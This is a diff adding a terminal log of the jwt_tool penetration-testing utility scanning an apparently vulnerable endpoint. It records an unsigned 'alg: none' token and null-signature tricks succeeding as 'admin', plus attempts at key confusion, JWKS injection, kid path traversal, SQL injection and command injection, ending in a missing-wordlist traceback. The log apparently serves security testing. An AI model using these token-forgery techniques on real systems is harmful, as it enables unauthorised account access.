@@ -1,0 +1,90 @@
+
+   [48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\ [48;5;24m [0m[48;5;24m [0m\      [48;5;24m [0m[48;5;24m [0m\ [48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\  [48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\                  [48;5;24m [0m[48;5;24m [0m\ 
+   \__[48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m | [48;5;24m [0m\  [48;5;24m [0m[48;5;24m [0m |\__[48;5;24m [0m[48;5;24m [0m  __| \__[48;5;24m [0m[48;5;24m [0m  __|                 [48;5;24m [0m[48;5;24m [0m |
+      [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\ [48;5;24m [0m[48;5;24m [0m |   [48;5;24m [0m[48;5;24m [0m |       [48;5;24m [0m[48;5;24m [0m | [48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\   [48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\  [48;5;24m [0m[48;5;24m [0m |
+      [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m [48;5;24m [0m[48;5;24m [0m [48;5;24m [0m[48;5;24m [0m\[48;5;24m [0m[48;5;24m [0m |   [48;5;24m [0m[48;5;24m [0m |       [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m  __[48;5;24m [0m[48;5;24m [0m\ [48;5;24m [0m[48;5;24m [0m  __[48;5;24m [0m[48;5;24m [0m\ [48;5;24m [0m[48;5;24m [0m |
+[48;5;24m [0m[48;5;24m [0m\   [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m  _[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m |   [48;5;24m [0m[48;5;24m [0m |       [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |  [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |  [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |
+[48;5;24m [0m[48;5;24m [0m |  [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m  / \[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m |   [48;5;24m [0m[48;5;24m [0m |       [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |  [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |  [48;5;24m [0m[48;5;24m [0m |[48;5;24m [0m[48;5;24m [0m |
+\[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m  |[48;5;24m [0m[48;5;24m [0m  /   \[48;5;24m [0m[48;5;24m [0m |   [48;5;24m [0m[48;5;24m [0m |       [48;5;24m [0m[48;5;24m [0m |\[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m  |\[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m  |[48;5;24m [0m[48;5;24m [0m |
+ \______/ \__/     \__|   \__|[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m[48;5;24m [0m\__| \______/  \______/ \__|
+ [36mVersion 2.3.0          [0m      \______|             [36m@ticarpi[0m      
+
+/home/pentester/.jwt_tool/jwtconf.ini
+[+] RATE-LIMIT: Running at 20.0 requests per second
+
+Original JWT: eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.
+
+=====================
+Decoded Token Values:
+=====================
+
+Token header values:
+[+] alg = "none"
+
+Token payload values:
+[+] sub = "1"
+
+----------------------
+JWT common timestamps:
+iat = IssuedAt
+exp = Expires
+nbf = NotBefore
+----------------------
+
+[+] Sending token
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Sending token Response Code: 200, 14 bytes
+Running Scanning Module:
+Running prescan checks...
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Prescan: original token Response Code: 200, 14 bytes
+jwttool_cc1770bdecdd277833674b96ed8f6250 Prescan: no token Response Code: 401, 6 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Prescan: Broken signature Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Prescan: repeat original token Response Code: 200, 14 bytes
+
+LAUNCHING SCAN: JWT Attack Playbook
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Broken signature Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Persistence check 1 (should always be valid) Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_244e119d3a6fcdde2592e469f3dd711f Claim processing check in sub claim Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Persistence check 2 (should always be valid) Response Code: 200, 14 bytes
+jwttool_41a4a46da14dc5d74ec96316ce66dfda Exploit: Blank password accepted in signature (-X b) Response Code: 401, 6 bytes
+jwttool_485e6678c415ed9743e02aadb09cbf6c Exploit: 'Psychic Signature' accepted in ECDSA signing (-X p) Response Code: 401, 6 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Exploit: Null signature (-X n) Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_d004247c52c928d711c91540fb0c35df Exploit: "alg":"none" (-X a) Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_c04afed36fcd92b9dd84812eb80d6159 Exploit: "alg":"None" (-X a) Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_c14a5342f0a3c068b1666685694277bc Exploit: "alg":"NONE" (-X a) Response Code: 200, 14 bytes
+[+] FOUND "Welcome, admin" in response:
+jwttool_8fe1b8f8334cb4c0e8e5620d1f4ce710 Exploit: "alg":"nOnE" (-X a) Response Code: 200, 14 bytes
+File loaded: /home/pentester/.jwt_tool/jwttool_custom_public_RSA.pem
+jwttool_23e78448e84ea23e3f5fc4eb2125de95 Exploit: RSA Key Confusion Exploit (provided Public Key) Response Code: 401, 6 bytes
+key: /home/pentester/.jwt_tool/jwttool_custom_private_RSA.pem
+jwttool_bd1476882202af9161b30f4c62d6947d Exploit: Injected JWKS (-X i) Response Code: 401, 6 bytes
+jwttool_d24dad20c5764d060a0207cb9d511221 Exploit: Spoof JWKS (-X s) Response Code: 401, 6 bytes
+jwttool_fa0850b984857b97d989f1d91e4446bc Injected kid claim - null-signed with blank kid Response Code: 401, 6 bytes
+jwttool_2e75a7bcd1f48e426c6d988dcfb70658 Injected kid claim - null-signed with kid="[path traversal]/dev/null" Response Code: 401, 6 bytes
+jwttool_6a5fc5f4641dbe0a2ebf294dc559fa06 Injected kid claim - null-signed with kid="/dev/null" Response Code: 401, 6 bytes
+jwttool_e0d752e2600fd30d954facb97fbcc3c5 Injected kid claim - null-signed with kid="/invalid_path" Response Code: 401, 6 bytes
+jwttool_6cd6e2d150fd0acd9b851e932eb5946b Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?) Response Code: 401, 6 bytes
+jwttool_8259dbf1696d791709f23231a9e9630e Injected kid claim - signed with secret = '1' from SQLi Response Code: 401, 6 bytes
+External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option
+Traceback (most recent call last):
+  File "/opt/jwt_tool/jwt_tool.py", line 2221, in <module>
+    runScanning()
+    ~~~~~~~~~~~^^
+  File "/opt/jwt_tool/jwt_tool.py", line 1729, in runScanning
+    scanModePlaybook()
+    ~~~~~~~~~~~~~~~~^^
+  File "/opt/jwt_tool/jwt_tool.py", line 1527, in scanModePlaybook
+    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
+         ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory: 'jwt-common.txt'
